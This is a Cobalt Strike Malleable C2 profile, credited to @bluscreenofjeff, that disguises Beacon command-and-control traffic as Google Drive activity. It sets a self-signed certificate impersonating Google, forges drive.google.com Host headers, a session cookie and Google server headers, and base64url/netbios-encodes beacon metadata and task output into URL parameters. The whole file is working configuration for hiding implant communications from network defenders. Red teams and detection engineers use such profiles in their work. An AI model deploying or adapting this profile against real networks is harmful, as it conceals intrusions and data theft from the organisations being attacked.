#
# Google Drive
# 
# Author: @bluscreenofjeff
#

#set https cert info
https-certificate {
    set CN       "*.google.com"; #Common Name
    set O        "Google Inc"; #Organization Name
    set C        "US"; #Country
    set L        "Mountain View"; #Locality
    set ST       "California"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

#default Beacon sleep duration and jitter
set sleeptime "60000";
set jitter    "20";

#default useragent for HTTP comms
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

#IP address used to indicate no tasks are available to DNS Beacon
set dns_idle "8.8.4.4";

#Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_sleep "0";

#Maximum length of hostname when uploading data over DNS (0-255)
set maxdns    "235";

http-get {

    set uri "/viewerng/meta";

    client {

        header "Accept" "text/html,application/xml;*/*;";
        header "Accept-Encoding" "gzip, deflate";
        header "Host" "drive.google.com";
        header "Cookie" "SID=KsY0f3fxIeBLQRn2wHMhgJvTkFbWZIEqNyABgX_nveBtm9LeEmsHn6I9OmYzpw;";

        #session metadata
        metadata {
            base64url;
            netbios;
            base64url;
            parameter "id";
        }

        parameter "u" "0";
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "Pragma" "no-cache";
        header "Content-Disposition" "attachment; filename=\"json.txt\"; filename*=UTF-8''json.txt";
        header "X-Content-Type-Options" "nosniff";
        header "X-Frame-Options" "SAMEORIGIN";
        header "X-XSS-Protection" "1; mode=block";
        header "Server" "GSE";
        header "Connection" "close";


        #Beacon's tasks
        output {
            print;
        }
    }
}

http-post {
    
    set uri "/viewersng/meta";
    set verb "GET";
    
    client {

        header "Accept" "text/html,application/xml;*/*;";
        header "Accept-Encoding" "gzip, deflate";
        header "Host" "drive.google.com";
        header "Cookie" "SID=KsY0f3fxIeBLQRn2wHMhgJvTkFbWZIEqNyABgX_nveBtm9LeEmsHn6I9OmYzpw;";


        output {
            base64url;
            netbios;
            base64url;
            parameter "id";
        }

        #session ID
        id {
            parameter "u";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "Pragma" "no-cache";
        header "Content-Disposition" "attachment; filename=\"json.txt\"; filename*=UTF-8''json.txt";
        header "X-Content-Type-Options" "nosniff";
        header "X-Frame-Options" "SAMEORIGIN";
        header "X-XSS-Protection" "1; mode=block";
        header "Server" "GSE";
        header "Connection" "close";


        output {
            print;
        }
    }
}

#change the stager server
http-stager {
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "Pragma" "no-cache";
    }
}
